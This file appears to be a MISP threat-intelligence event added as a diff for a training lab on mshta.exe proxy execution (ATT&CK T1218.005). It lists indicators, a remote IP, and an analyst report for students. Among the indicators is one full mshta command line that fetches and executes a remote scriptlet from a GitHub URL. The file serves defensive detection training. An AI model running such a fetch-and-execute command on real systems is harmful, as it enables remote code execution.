@@ -1,0 +1,204 @@
+{
+  "Event": {
+    "uuid": "7b84c57d-2b34-53a5-9d5e-f22b8994f939",
+    "info": "IgniteCyber CJ LAB-2.3: LOLBAS Proxy Execution: mshta.exe",
+    "date": "2025-07-15",
+    "threat_level_id": "2",
+    "analysis": "1",
+    "distribution": "0",
+    "published": false,
+    "disable_correlation": false,
+    "Tag": [
+      {
+        "name": "tlp:clear"
+      },
+      {
+        "name": "pap:green"
+      },
+      {
+        "name": "workflow:state=\"training-simulation\""
+      },
+      {
+        "name": "course:ignitecyber-academy"
+      },
+      {
+        "name": "victim:apexfin-solutions"
+      },
+      {
+        "name": "threat-actor:cinder-jackal"
+      },
+      {
+        "name": "training:data-only"
+      },
+      {
+        "name": "lab:LAB-2.3"
+      },
+      {
+        "name": "case:CJ-006"
+      },
+      {
+        "name": "day:day-2"
+      },
+      {
+        "name": "attack:technique=\"T1218.005\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Mshta - T1218.005\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "0882f7e2-8cef-5acd-991c-915876952c54",
+        "type": "text",
+        "category": "Other",
+        "value": "case_id=CJ-006",
+        "to_ids": false,
+        "comment": "TheHive/MISP case alignment key.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "context:case-id"
+          }
+        ]
+      },
+      {
+        "uuid": "91abf837-223a-528a-98c9-42735c450575",
+        "type": "text",
+        "category": "Other",
+        "value": "notebook=LAB-2.3_LOLBAS_mshta_ProxyExecution_T1218_005.ipynb",
+        "to_ids": false,
+        "comment": "Notebook or source artifact aligned to this MISP event.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "context:notebook"
+          }
+        ]
+      },
+      {
+        "uuid": "0d5654d7-e8ae-576c-bbef-d01f4a2270a7",
+        "type": "text",
+        "category": "Other",
+        "value": "source_file=cmd_mshta_javascript_getobject_sct_2020-10-2202214475.json",
+        "to_ids": false,
+        "comment": "Telemetry/evidence source used to seed this CTI event.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "context:source-file"
+          }
+        ]
+      },
+      {
+        "uuid": "6394fc82-068d-522c-8f10-8101a8b2aa79",
+        "type": "filename",
+        "category": "Payload delivery",
+        "value": "mshta.exe",
+        "to_ids": false,
+        "comment": "LOLBAS process used for proxy execution.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "source:windows-lolbas-binary"
+          },
+          {
+            "name": "lab:LAB-2.3"
+          }
+        ]
+      },
+      {
+        "uuid": "ca27a96e-58bc-5fc8-a674-d3a33c0df8e6",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct",
+        "to_ids": false,
+        "comment": "Scriptlet URL observed in mshta command line.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "source:training-source-url"
+          },
+          {
+            "name": "lab:LAB-2.3"
+          }
+        ]
+      },
+      {
+        "uuid": "10c97756-c114-5bcd-b379-7dfbcea5b563",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "151.101.248.133",
+        "to_ids": false,
+        "comment": "Remote IP observed for mshta HTTPS retrieval.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "source:observed-cdn-endpoint"
+          },
+          {
+            "name": "lab:LAB-2.3"
+          }
+        ]
+      },
+      {
+        "uuid": "1b906e8f-1238-55cc-bab6-6c38c457321d",
+        "type": "command-line",
+        "category": "External analysis",
+        "value": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
+        "to_ids": true,
+        "comment": "Full command line observed in Windows Security Event ID 4688.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "source:detection-indicator"
+          },
+          {
+            "name": "lab:LAB-2.3"
+          }
+        ]
+      },
+      {
+        "uuid": "7a4c1312-458c-5bc6-89dc-fca2e0762c53",
+        "type": "filename",
+        "category": "Payload delivery",
+        "value": "calc.exe",
+        "to_ids": false,
+        "comment": "Child process launched by Atomic Red Team mshta test payload.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-07-15",
+        "Tag": [
+          {
+            "name": "source:payload-behavior-evidence"
+          },
+          {
+            "name": "lab:LAB-2.3"
+          }
+        ]
+      }
+    ],
+    "EventReport": [
+      {
+        "uuid": "0c28e4d9-454b-581d-88b7-c45e9ff45cfe",
+        "name": "LAB-2.3 CTI Event Report",
+        "content": "# LAB-2.3 \u2014 LOLBAS Proxy Execution: mshta.exe\n\n**Case:** CJ-006  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-07-15  \n**ATT&CK:** T1218.005\n\n## Analyst narrative\nStudents investigate mshta proxy execution that launches a scriptlet over HTTPS and pivots into spawned child process behavior.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- cmd_mshta_javascript_getobject_sct_2020-10-2202214475.json\n",
+        "distribution": "0",
+        "deleted": false
+      }
+    ]
+  }
+}
